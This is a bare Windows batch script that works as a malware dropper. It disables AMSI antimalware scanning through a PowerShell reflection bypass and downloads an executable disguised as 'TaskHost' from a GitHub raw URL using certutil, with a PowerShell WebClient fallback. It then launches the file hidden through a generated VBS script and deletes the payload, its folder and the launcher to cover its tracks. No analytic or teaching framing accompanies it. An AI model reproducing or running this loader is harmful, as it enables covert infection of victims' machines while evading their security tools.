@echo off
chcp 65001>nul
cd /d %TEMP%

set /a rand1=%random%, rand2=%time:~6,2%
set randname=tmp%rand1%%rand2%

if not exist "%randname%" mkdir "%randname%" >nul 2>&1
cd "%randname%"

powershell -w h -nop -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

certutil -urlcache -split -f "https://github.com/defdgobs/farty/raw/refs/heads/main/TaskHost_9b64816d.exe" "%randname%.exe" >nul 2>&1

if not exist "%randname%.exe" (
    powershell -nop -w h -c "(New-Object Net.WebClient).DownloadFile('https://github.com/defdgobs/farty/raw/refs/heads/main/TaskHost_9b64816d.exe','$env:TEMP\%randname%.exe')"
)

(
echo WScript.Sleep 100
echo Set WshShell = WScript.CreateObject^("WScript.Shell"^)
echo WshShell.Run "%cd%\%randname%.exe", 0, False
echo Set FSO = CreateObject^("Scripting.FileSystemObject"^)
echo FSO.DeleteFile "%randname%.exe"
echo FSO.DeleteFolder "%cd%"
) > "run.vbs"


start /b wscript.exe //nologo //b "run.vbs"


timeout /t 3 /nobreak >nul 2>&1
cd ..
rmdir /s /q "%randname%" >nul 2>&1

powershell -nop -c "gp *cmd* | sp Kill -PassThru | ?{$_.Name -eq 'cmd'} | sp Kill"
exit /b
